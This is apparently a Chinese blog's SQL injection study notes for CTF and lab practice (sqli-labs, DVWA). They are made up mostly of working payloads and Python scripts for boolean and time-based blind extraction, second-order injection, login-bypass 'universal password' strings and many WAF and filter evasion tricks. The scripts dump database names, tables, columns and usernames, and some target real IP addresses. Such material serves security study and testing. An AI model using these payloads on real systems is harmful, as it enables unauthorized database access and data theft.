<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> client_ip (ip) <span class="keyword">values</span> (<span class="string">'ip'</span>+(<span class="keyword">select</span> <span class="keyword">case</span> <span class="keyword">when</span> (<span class="keyword">substring</span>((<span class="keyword">select</span> <span class="keyword">user</span>()) <span class="keyword">from</span> <span class="number">1</span> <span class="keyword">for</span> <span class="number">1</span>)=<span class="string">'e'</span>) <span class="keyword">then</span> <span class="keyword">sleep</span>(<span class="number">3</span>) <span class="keyword">else</span> <span class="number">0</span> <span class="keyword">end</span>)); <span class="comment">--第一种payload</span></span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> client_ip (ip) <span class="keyword">values</span> (<span class="string">'ip'</span>+(<span class="keyword">select</span> <span class="keyword">case</span> <span class="keyword">when</span> (<span class="keyword">substring</span>((<span class="keyword">select</span> <span class="keyword">user</span>()) <span class="keyword">from</span> <span class="number">-1</span>)=<span class="string">'t'</span>) <span class="keyword">then</span> <span class="keyword">sleep</span>(<span class="number">3</span>) <span class="keyword">else</span> <span class="number">0</span> <span class="keyword">end</span>)); <span class="comment">--第二种payload</span></span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8 </span></span><br><span class="line"><span class="keyword">import</span> requests </span><br><span class="line">maystr=<span class="string">"0987654321qwertyuiopasdfghjklzxcvbnm"</span></span><br><span class="line">url=<span class="string">"http://127.0.0.1/sql/sql.php"</span></span><br><span class="line">flag=<span class="string">""</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">32</span>):</span><br><span class="line">   <span class="keyword">for</span> str <span class="keyword">in</span> maystr:</span><br><span class="line">     headers=&#123;<span class="string">"x-forwarded-for"</span>:<span class="string">"127.0.0.1'+"</span>+<span class="string">"(select case when (substring((select flag from flag ) from %d for 1 )='%s') then sleep(6) else sleep(0) end ) and '1'='1"</span>%(i+<span class="number">1</span>,str)&#125;   <span class="comment">#%d  %s   %(i+1,str)  可以用format的形式：&#123;&#125; &#123;&#125;  .format(i+1,str)</span></span><br><span class="line"> <span class="comment"># proxy=&#123;"http":"http://127.0.0.1:8080"&#125;</span></span><br><span class="line"> <span class="comment"># res=requests.get(url,headers=headers,timeout=3)</span></span><br><span class="line">     <span class="keyword">try</span>: </span><br><span class="line">         res=requests.get(url,headers=headers,timeout=<span class="number">4</span>)</span><br><span class="line">     <span class="keyword">except</span> requests.exceptions.ReadTimeout,e:</span><br><span class="line">         flag=flag+str</span><br><span class="line">         <span class="keyword">print</span> <span class="string">"flag:"</span>,flag</span><br><span class="line">         <span class="keyword">break</span></span><br><span class="line">     <span class="keyword">except</span> KeyboardInterrupt,e:</span><br><span class="line">        exit(<span class="number">0</span>)</span><br><span class="line">     <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"> <span class="comment">#print i+1,str</span></span><br></pre></td></tr></table></figure>



<p>其中有个问题，没过滤 union 、select，但是 union select 就不行，中间加上 %0a、%0b 或者 tab 什么的 </p>
<p>然后就能发现</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">username &#x3D; admin&#39; union%0aselect 1,2</span><br><span class="line">password &#x3D; 1</span><br><span class="line">返回值是password error</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">username &#x3D; admin&#39; union%0aselect 1,2</span><br><span class="line">password &#x3D; 2</span><br><span class="line">没有回显</span><br></pre></td></tr></table></figure>

<p>1</p>
<p>2</p>
<p>3</p>
<p>4</p>
<p>5</p>
<p>6</p>
<p>7</p>
<p>然后就可以注入了！</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url = <span class="string">'http://114.67.224.31:32769'</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_slowly</span><span class="params">(inject)</span>:</span></span><br><span class="line">    flag=<span class="string">''</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">50</span>):</span><br><span class="line">        key=<span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">33</span>,<span class="number">127</span>):</span><br><span class="line">            temp_inject = <span class="string">"' union  select 1,ascii(substring(("</span>+str(inject)+<span class="string">"),"</span>+str(i)+<span class="string">",1))="</span>+str(j)+<span class="string">"#"</span></span><br><span class="line">            data = &#123;<span class="string">"username"</span>:temp_inject,<span class="string">"password"</span>:<span class="number">1</span>&#125;</span><br><span class="line">            content = requests.post(url=url,data=data).content</span><br><span class="line">            <span class="keyword">if</span> <span class="string">"error"</span> <span class="keyword">not</span> <span class="keyword">in</span> content:</span><br><span class="line">                key=<span class="number">1</span></span><br><span class="line">                flag+=chr(j)</span><br><span class="line">                <span class="keyword">print</span> flag</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">if</span> key==<span class="number">0</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">'__main__'</span>:</span><br><span class="line">    inject = <span class="string">"select flag from flag"</span>    //你看 这个传参就很有灵性</span><br><span class="line">    get_slowly(inject)</span><br><span class="line"><span class="comment">#9620cf959a51bdce3ae8ff2849cd8f5b</span></span><br><span class="line">————————————————</span><br><span class="line">版权声明：本文为CSDN博主「Assassin__is__me」的原创文章，遵循 CC <span class="number">4.0</span> BY-SA 版权协议，转载请附上原文出处链接及本声明。</span><br><span class="line">原文链接：https://blog.csdn.net/qq_35078631/article/details/<span class="number">78587457</span></span><br></pre></td></tr></table></figure>

<h3 id="时间盲注"><a href="#时间盲注" class="headerlink" title="时间盲注"></a>时间盲注</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">猜解数据库名长度</span><br><span class="line">?id=1'and if(length(database())=8,1,sleep(5))<span class="comment">--+   看一下数据库名长度  如果正确页面有回显 =7就回显为空白   </span></span><br><span class="line">猜解数据库名的值 </span><br><span class="line">?id=1'and if(left(database(),1)='a',1,sleep(5))<span class="comment">--+数据库名第一位是否为a</span></span><br><span class="line">?id=1'and if(left(database(),1)='s',1,sleep(5))<span class="comment">--+数据库名第一位是否为s</span></span><br><span class="line">?id=1'and if(ascii(substr((<span class="keyword">select</span> <span class="keyword">database</span>() <span class="keyword">limit</span> <span class="number">0</span>,<span class="number">1</span>),&#123;&#125;,<span class="number">1</span>))&gt;&#123;&#125;,<span class="number">1</span>,<span class="keyword">sleep</span>(<span class="number">5</span>))<span class="comment">--+</span></span><br><span class="line">?<span class="keyword">id</span>=<span class="number">1</span><span class="string">'and if(ascii(substr(database(),1,1))=115,1,sleep(5))--+</span></span><br><span class="line"><span class="string">?id=1'</span><span class="keyword">and</span> <span class="keyword">if</span>(<span class="keyword">ascii</span>(<span class="keyword">substr</span>(<span class="keyword">database</span>(),&#123;&#125;,<span class="number">1</span>))&gt;&#123;&#125;,<span class="number">1</span>,<span class="keyword">sleep</span>(<span class="number">5</span>))<span class="comment">--+</span></span><br><span class="line"><span class="keyword">or</span>  <span class="keyword">ASCII</span> 二分法 </span><br><span class="line">?<span class="keyword">id</span>=<span class="number">1</span>’ <span class="keyword">and</span> <span class="keyword">if</span>(<span class="keyword">ascii</span>(<span class="keyword">substr</span>(<span class="keyword">database</span>(),<span class="number">1</span>,<span class="number">1</span>))&gt;<span class="number">97</span>,<span class="number">1</span>,<span class="keyword">sleep</span>(<span class="number">5</span>)) <span class="comment"># </span></span><br><span class="line">一个个找，然后就能够猜出完整的库名 dvwa</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">?<span class="keyword">id</span>=<span class="number">1</span><span class="string">'and if(ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))&gt;80,1,sleep(5))--+  爆表名，第一位ascii作比较</span></span><br><span class="line"><span class="string">?id=1'</span> <span class="keyword">and</span> <span class="keyword">if</span>(<span class="keyword">ascii</span>(<span class="keyword">substr</span>((<span class="keyword">select</span> <span class="keyword">group_concat</span>(table_name) <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema=<span class="keyword">database</span>()),<span class="number">1</span>,<span class="number">1</span>))&gt;<span class="number">80</span>,<span class="number">1</span>,<span class="keyword">sleep</span>(<span class="number">5</span>))<span class="comment">--+</span></span><br><span class="line">?<span class="keyword">id</span>=<span class="number">1</span><span class="string">' and if(ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),&#123;&#125;,1))&gt;&#123;&#125;,1,sleep(1))--+</span></span><br><span class="line"><span class="string">?id=1'</span><span class="keyword">and</span> <span class="keyword">if</span>(<span class="keyword">ascii</span>(<span class="keyword">substr</span>((<span class="keyword">select</span> table_name <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema=<span class="keyword">database</span>() <span class="keyword">limit</span> <span class="number">0</span>,<span class="number">1</span>),&#123;&#125;,<span class="number">1</span>))&gt;&#123;&#125;,<span class="number">1</span>,<span class="keyword">sleep</span>(<span class="number">5</span>))<span class="comment">--+</span></span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">时间盲注脚本</span><br><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url = <span class="string">"http://127.0.0.1/sqli-labs-master/Less-5/?id="</span></span><br><span class="line">flag = <span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">200</span>):</span><br><span class="line">    low = <span class="number">32</span></span><br><span class="line">    high = <span class="number">127</span></span><br><span class="line">    <span class="keyword">while</span> low &lt; high:</span><br><span class="line">        mid = (low+high)//<span class="number">2</span></span><br><span class="line">        payload1 = <span class="string">"1'and if(ascii(substr(database(),&#123;&#125;,1))&gt;&#123;&#125;,1,sleep(1))--+"</span>.format(i,mid)<span class="comment">#security</span></span><br><span class="line">        payload2 = <span class="string">"1' and if(ascii(subtr((select group_concat(table_name) from information_schema.tables where table_schema=database()),&#123;&#125;,1))&gt;&#123;&#125;,1,sleep(1))--+"</span>.format(i,mid)<span class="comment">#emails,referers,uagents,users</span></span><br><span class="line">        <span class="comment">#payload5 = "1'and if(ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),&#123;&#125;,1))&gt;&#123;&#125;,1,sleep(1))--+".format(i, mid) #只能跑出单个emails</span></span><br><span class="line">        payload3 = <span class="string">"1' and if(ascii(substr((select group_concat(column_name) from information_schema.columns where table_name='users'),&#123;&#125;,1))&gt;&#123;&#125;,1,sleep(1))--+"</span>.format(i,mid)</span><br><span class="line">        <span class="comment"># emails:id,email_id ,referers:id,referer,ip_address,uagents:id,uagent,ip_address,username ,users:id,username,password,username,passwd,sex,age,email,phone,id</span></span><br><span class="line">        payload4 = <span class="string">"1' and if(ascii(substr((select group_concat(username) from security.users),&#123;&#125;,1))&gt;&#123;&#125;,1,sleep(1))--+"</span>.format(i,mid)</span><br><span class="line">        r = requests.get(url=url+payload4)</span><br><span class="line">        <span class="comment"># print(payload1)</span></span><br><span class="line">        <span class="comment"># print(r.text)</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">'You are in'</span> <span class="keyword">in</span> r.text:    <span class="comment">#语句正确与否两个回显是不一样的   You are in</span></span><br><span class="line">            low = mid + <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            high = mid</span><br><span class="line">    <span class="comment"># print(low,mid,high)</span></span><br><span class="line">    flag += chr(low)</span><br><span class="line">    print(flag)</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sleep(n) 延时n秒</span><br><span class="line">benchmark(1000000,md5(1))</span><br></pre></td></tr></table></figure>

<h4 id="绕过："><a href="#绕过：" class="headerlink" title="绕过："></a><strong>绕过：</strong></h4><ul>
<li><code>if(bool,sleep(5),0) =&gt; case when (bool) then sleep(5) else 0 end</code></li>
<li><code>sleep((bool)\*5) EG: sleep((substr(user(),1,1)=&#39;r&#39;)\*5) 思维发散：利用bool各种加减乘除操作</code></li>
</ul>
<h4 id="1-判断是否存在注入，"><a href="#1-判断是否存在注入，" class="headerlink" title="1. 判断是否存在注入，"></a>1. <em>判断是否存在注入</em>，</h4><p>输入 1’ and sleep (5) #，感觉到明显延迟；</p>
<p>输入 1 and sleep (5) #，没有延迟；</p>
<p>说明存在字符型的基于时间的盲注。</p>
<h4 id="2-猜解当前数据库名"><a href="#2-猜解当前数据库名" class="headerlink" title="2. 猜解当前数据库名"></a>2. 猜解当前数据库名</h4><p>首先猜解数据名的长度：</p>
<p>1’ and if (length (database ())=1,sleep (5),1) # 没有延迟</p>
<p>1’ and if (length (database ())=2,sleep (5),1) # 没有延迟</p>
<p>1’ and if (length (database ())=3,sleep (5),1) # 没有延迟</p>
<p>1’ and if (length (database ())=4,sleep (5),1) # 明显延迟</p>
<p>说明数据库名长度为 4 个字符。</p>
<p>接着采用二分法猜解数据库名：</p>
<p>1’ and if (ascii (substr (database (),1,1))&gt;97,sleep (5),1)# 明显延迟</p>
<p>…</p>
<p>1’ and if (ascii (substr (database (),1,1))&lt;100,sleep (5),1)# 没有延迟</p>
<p>1’ and if (ascii (substr (database (),1,1))&gt;100,sleep (5),1)# 没有延迟</p>
<p>说明数据库名的第一个字符为小写字母 d。</p>
<p>…</p>
<p>重复上述步骤，即可猜解出数据库名。</p>
<h4 id="3-猜解数据库中的表名"><a href="#3-猜解数据库中的表名" class="headerlink" title="3. 猜解数据库中的表名"></a>3. 猜解数据库中的表名</h4><p>首先猜解数据库中表的数量：</p>
<p>1’ and if ((select count (table_name) from information_schema.tables where table_schema=database () )=1,sleep (5),1)# 没有延迟</p>
<p>1’ and if ((select count (table_name) from information_schema.tables where table_schema=database () )=2,sleep (5),1)# 明显延迟</p>
<p>说明数据库中有两个表。</p>
<p>接着挨个猜解表名：</p>
<p>1’ and if (length (substr ((select table_name from information_schema.tables where table_schema=database () limit 0,1),1))=1,sleep (5),1) # 没有延迟</p>
<p>…</p>
<p>1’ and if (length (substr ((select table_name from information_schema.tables where table_schema=database () limit 0,1),1))=9,sleep (5),1) # 明显延迟</p>
<p>说明第一个表名的长度为 9 个字符。</p>
<p>采用二分法即可猜解出表名。</p>
<h4 id="4-猜解表中的字段名"><a href="#4-猜解表中的字段名" class="headerlink" title="4. 猜解表中的字段名"></a>4. 猜解表中的字段名</h4><p>首先猜解表中字段的数量：</p>
<p>1’ and if ((select count (column_name) from information_schema.columns where table_name= ’users’)=1,sleep (5),1)# 没有延迟</p>
<p>…</p>
<p>1’ and if ((select count (column_name) from information_schema.columns where table_name= ’users’)=8,sleep (5),1)# 明显延迟</p>
<p>说明 users 表中有 8 个字段。</p>
<p>接着挨个猜解字段名：</p>
<p>1’ and if (length (substr ((select column_name from information_schema.columns where table_name= ’users’ limit 0,1),1))=1,sleep (5),1) # 没有延迟</p>
<p>…</p>
<p>1’ and if (length (substr ((select column_name from information_schema.columns where table_name= ’users’ limit 0,1),1))=7,sleep (5),1) # 明显延迟</p>
<p>说明 users 表的第一个字段长度为 7 个字符。</p>
<p>采用二分法即可猜解出各个字段名。</p>
<h4 id="5-猜解数据"><a href="#5-猜解数据" class="headerlink" title="5. 猜解数据"></a>5. 猜解数据</h4><p>同样采用二分法。</p>
<h2 id="二次注入"><a href="#二次注入" class="headerlink" title="二次注入"></a>二次注入</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Less-24</span><br><span class="line">注册admin&#39;# 123456</span><br></pre></td></tr></table></figure>

<p><img src="/2019/11/24/1%20sql%E6%B3%A8%E5%85%A5/C:%5CUsers%5C60120%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20200717185407999.png" alt="image-20200717185407999"></p>
<p>修改密码</p>
<p><img src="/2019/11/24/1%20sql%E6%B3%A8%E5%85%A5/C:%5CUsers%5C60120%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20200717185506805.png" alt="image-20200717185506805"></p>
<blockquote>
<p>原理：在第一次进行数据库插入数据的时候，仅仅只是使用了 addslashes  或者是借助get_magic_quotes_gpc  对其中的特殊字符进行了转义，在写入数据库的时候还是保留了原来的数据，但是数据本身还是脏数据。比如在第一次插入数据的时候，数据中带有单引号，直接插入到了数据库中；然后在下一次使用中在【拼凑】的过程中，就形成了二次注入。</p>
</blockquote>
<p><img src="/2019/11/24/1%20sql%E6%B3%A8%E5%85%A5/image-20200724162700969.png" alt="image-20200724162700969"></p>
<p><strong>实例：</strong> 强网杯 three hit ：<a href="http://www.freebuf.com/articles/web/167089.html" target="_blank" rel="noopener">http://www.freebuf.com/articles/web/167089.html</a></p>
<p><strong>可以把二次注入的payload用十六进制编码写入数据库来绕过过滤</strong></p>
<h2 id="fuzz-看waf"><a href="#fuzz-看waf" class="headerlink" title="fuzz  看waf"></a>fuzz  看waf</h2><p> 先fuzz单字符来看看waf。还是拦截了很多的，而且逗号和空格也被过滤了。 </p>
<p><img src="/2019/11/24/1%20sql%E6%B3%A8%E5%85%A5/20190606135816-14265b86-8820-1.jpeg.png" alt="20190606135816-14265b86-8820-1.jpeg"></p>
<h2 id="SQL万能密码"><a href="#SQL万能密码" class="headerlink" title="SQL万能密码"></a>SQL万能密码</h2><p>1’ or 1=1 #</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">select * from user where username&#x3D;&#39;&#39; and pass&#x3D;&#39;&#39;</span><br><span class="line"># 构造 username&#x3D;devnull&#39; or &#39;1后，sql 语句变成</span><br><span class="line">select * from user where username&#x3D;&#39;devnull&#39; or &#39;1&#39; and pass&#x3D;&#39;&#39;</span><br></pre></td></tr></table></figure>

<p>没有对单引号进行过滤 ‘or’=’or’</p>
<p>‘||1||’</p>
<p>admin’||’1</p>
<ol>
<li><p>“or”a”=”a </p>
</li>
<li><p>‘.).or.(‘.a.’=’.a </p>
</li>
<li><p>or 1=1– </p>
</li>
<li><p>‘or 1=1– </p>
</li>
<li><p>a’or’ 1=1– </p>
</li>
<li><p>“or 1=1– </p>
</li>
<li><p>‘or.’a.’=’a </p>
</li>
<li><p>“or”=”a’=’a </p>
</li>
<li><p>‘or”=’ </p>
</li>
<li><p>‘or’=’or’</p>
<blockquote>
<p>‘or 1# 还是说过长<br>‘*1#<br>‘%1#<br>‘=-#<br>有时候#不管用是因为过滤了#号 用%23</p>
</blockquote>
</li>
</ol>
<p>用户名:”or “a”=”a<br>密码:”or “a”=”a</p>
<hr>
<p> 1：”or “a”=”a<br> 2： ‘.).or.(‘.a.’=’.a<br> 3：or 1=1–<br>4：’or 1=1–<br>5：a’or’ 1=1–<br>6：”or 1=1–<br>7：’or.’a.’=’a<br> 8：”or”=”a’=’a<br> 9：’or’’=’<br> 10：’or’=’or’<br>原理都是利用SQL语法来利用注入,其实这也是注入的一种,都是因为提交字符未加过滤或过滤不严而导致的.<br>其实万能是没有的,默认是很多的,</p>
<h2 id="多条数据显示"><a href="#多条数据显示" class="headerlink" title="多条数据显示"></a>多条数据显示</h2><p> concat()<br> group_concat()<br> concat_ws()</p>
<h2 id="相关函数"><a href="#相关函数" class="headerlink" title="相关函数"></a>相关函数</h2><p> system_user() 系统用户名<br> user() 用户名<br> current_user 当前用户名<br> session_user()连接数据库的用户名<br> database() 数据库名<br> version() MYSQL数据库版本<br> load_file() MYSQL读取本地文件的函数<br> @@datadir 读取数据库路径<br> @@basedir MYSQL 安装路径<br> @@version_compile_os 操作系统 Windows Server 2003</p>
<h2 id="绕过waf"><a href="#绕过waf" class="headerlink" title="绕过waf"></a>绕过waf</h2><p><img src="/2019/11/24/1%20sql%E6%B3%A8%E5%85%A5/image-20200725200836410.png" alt></p>
<blockquote>
<p>绕过空格过滤：<code>+，/**/ select..password、select+user()，双重空格，回车换行符(%0a,%a0)，宽字节(%df)</code>，<strong>圆括号</strong>， <code>%20  %09，%0a,%0b,%0c,%0d</code>等  UNION(SELECT xx) where(id)=(2)and(1)=(1) </p>
<p> %0c = form feed, new page<br> %09 = horizontal tab<br> %0d = carriage return<br> %0a = line feed, new line </p>
<blockquote>
<p> <code>// 使用括号，select, from , where 这些关键字不能用括号select(table_name)from(information_schema.tables)where(table_schema)=database()</code> </p>
</blockquote>
<blockquote>
<p>连续运算绕过使用连续等号<br><code>SELECT * from users where username=&#39;-1&#39;=&#39;&#39; and password=&#39;-1&#39;=&#39;&#39;</code> </p>
<p>从左到右运算，先计算username=’-1’，一般数据库里不会有’-1’，故该值为0。再计算0=’’，得到值为1。password=’-1’=’’同理。</p>
</blockquote>
<blockquote>
<p>绕过union,select等关键字过滤：大小写，双写(uniounionn,unionunion)，内联注释(/<em>!union</em>/) <code>/*！union*/</code>，编码</p>
<p>只要按照union  select from 的顺序出现，就被过滤 </p>
<p><code>/union([\s\S]+)select([\s\S]+)from/i</code> </p>
<p>绕过方法 </p>
<p><code>id=1=2|@c:=(select(1))union(select@c)</code> </p>
<p>读目录的exp为 </p>
<p><code>id=1=2|@c:=(select(flag)from(flag)where(flag&lt;0x30))union(select@c)</code></p>
</blockquote>
<p> 字符串黑名单 ： SELECT ‘a’ ‘d’ ‘mi’ ‘n’; CONCAT(‘a’, ‘d’); CONCAT_WS(‘’, ‘a’); group_concat(‘a’,’b’) </p>
<p>绕过引号过滤： 0x…… 、 hex() 、 unhex() 、 char() 、 %df(宽字节) </p>
<p>绕过and、or过滤：&amp;&amp;，||，%26%26，大小写，双写关键字(anandd,andand)，编码    <strong>异或运算符</strong> </p>
<ul>
<li><strong>使用 ^ : <code>username=admin&#39;^(ascii(mid((passwd)from(1)))&gt;=10)^&#39;1&#39;=&#39;1</code></strong></li>
<li><strong>1^1^1 真</strong> </li>
</ul>
<p>绕过order by ： into @,@,@… group by n </p>
<p> where ： having </p>
<p>绕过 id = 3 过滤： not id &gt; 3 and not id &lt; 4 </p>
<p>绕过 &gt; 10 过滤：  not between 0 and 10 </p>
<p>绕过 if   过滤: case when (bool) then 1 else 0 end </p>
<p>绕过小括号被过滤，使用正则匹配，如regexp binary ‘^.*$’或者使用笛卡儿积，如： </p>
<p>union select b.column_name from information_schema.tables a join information_schema.columns b join information_schema.columns c where 1=2</p>
<p>  绕过逗号过滤，’xor(select case when 2&gt;1 then sleep(4) else 0 end limit 0 offset 1)or’</p>
<ul>
<li><p>SUBSTR(password FROM 3 FOR 1) 等同于SUBSTR(PASSWORD,3,1) </p>
</li>
<li><p>SUBSTR(password FROM 2) 等同于 SUBSTR(PASSWORD,2) </p>
<ul>
<li>substr(database()from(3)for(1)) 等同于 mid(database()from(3)for(1))</li>
</ul>
</li>
</ul>
<ul>
<li>limit 1,1 中的逗号用limit 1 offset 1  </li>
</ul>
<p>碰到 “=” 等于号被过滤的情况。  可以使用 &lt;&gt; 不等于，！  也可以改用 like </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&gt;1&#39; || username like 0x61646d696e)#</span><br><span class="line"># 16进制转换后为，发现admin前后不能加&#39;，否则会找不到数据</span><br><span class="line">&gt;1&#39; || username like admin)#</span><br></pre></td></tr></table></figure>

<p> 1.过滤应对方法</p>
<p>可以利用 16进制进行绕过，抓包更改参数 id为1 union select 1,group_concat(column_name) from information_schema.columns where table_name=0×7573657273 #，查询成功：</p>
<p>2.过滤应对方法<br>只要不用’就行<br>1 or 1=1 #<br>1 order by 3#<br>1 union select 2,3#<br>2  union select version(),user()<br>id=2 union select 1,table_name from information_schema.tables where table_schema=(select database())   #<br>1  union select 1,group_concat(column_name) from information_schema.columns where table_name=(select table_name from information_schema.tables where table_schema=(select database())limit 1 )  #</p>
</blockquote>
<h3 id="技巧-反引号-与-联合的妙用"><a href="#技巧-反引号-与-联合的妙用" class="headerlink" title="技巧 反引号 `与@联合的妙用"></a>技巧 反引号 `与@联合的妙用</h3><blockquote>
<p>反引号用来引住列名、表名和<strong>别名（别名可以省去 as）</strong></p>
<p>@xxx 用来自定义变量（set @a=1;）</p>
<p><strong>@<code>xxx</code> 可以被当做一个自定义变量</strong></p>
<p>order by NULL 表示按默认的方式排序</p>
</blockquote>
<blockquote>
<p>ban掉 了 or或 and与 =连 用 ， 所 以 普 通 的 or 1=(paylaod)形 式 不 好 用 了 ， 这 里 可 以 用 异<br>或 注 入 （ 当 然 其 他 运 算 符 都 可 以 ）</p>
<p> 因 为 对 union过 滤 ， 所 以 不 能 用 联 合 查 询 了 ， or|and|substr|if|hex|mid|char|等 等 都 进 行<br> 了 过 滤 ， 这 里 只 能 用 报 错 注 入 ， updatexml， extractvalue都 可 以</p>
</blockquote>
<h2 id="regexp盲注-过滤了括号"><a href="#regexp盲注-过滤了括号" class="headerlink" title="regexp盲注 过滤了括号()"></a>regexp盲注 过滤了括号()</h2><ul>
<li>在盲注中，如果过滤了括号()，那么将无法使用substr等函数，于是无法正常的逐字节读取字段内容，此时可以使用 </li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM users WHERE name NOT REGEXP &#39;^a&#39;</span><br><span class="line">SELECT * FROM users WHERE name NOT REGEXP &#39;^ad&#39;</span><br><span class="line">SELECT * FROM users WHERE name NOT REGEXP &#39;^adm&#39;</span><br><span class="line">SELECT * FROM users WHERE name NOT REGEXP &#39;^admi&#39;</span><br><span class="line">SELECT * FROM users WHERE name NOT REGEXP &#39;^admin&#39;</span><br></pre></td></tr></table></figure>

<p>regexp相当于rlike，使用REGEXP，NOT REGEXP，RLIKE，NOT RLIKE绕过对括号的过滤 </p>
<h2 id="异-或-盲-注"><a href="#异-或-盲-注" class="headerlink" title="异 或 盲 注"></a>异 或 盲 注</h2><h3 id="条件"><a href="#条件" class="headerlink" title="条件"></a>条件</h3><p>题目过滤了<code>空格，+，*，or，substr</code>…等一些字符。而且#号注释也不起作用。 </p>
<p> 于是尝试异或注入。 </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;119.23.73.3:5004&#x2F;?id&#x3D;1&#39;^&#39;1   返回错误</span><br><span class="line">http:&#x2F;&#x2F;119.23.73.3:5004&#x2F;?id&#x3D;1&#39;^&#39;0   返回正常</span><br></pre></td></tr></table></figure>

<p><img src="/2019/11/24/1%20sql%E6%B3%A8%E5%85%A5/20190606135745-0118966c-8820-1.jpeg.png" alt="20190606135745-0118966c-8820-1.jpeg"></p>
<p> 检索数据库： </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id&#x3D;2&#39;^!(SELECT(ASCII(MID((SELECT(GROUP_CONCAT(schema_name))FROM(information_schema.schemata)),1,1))&#x3D;104))^&#39;1&#39;&#x3D;&#39;1</span><br></pre></td></tr></table></figure>

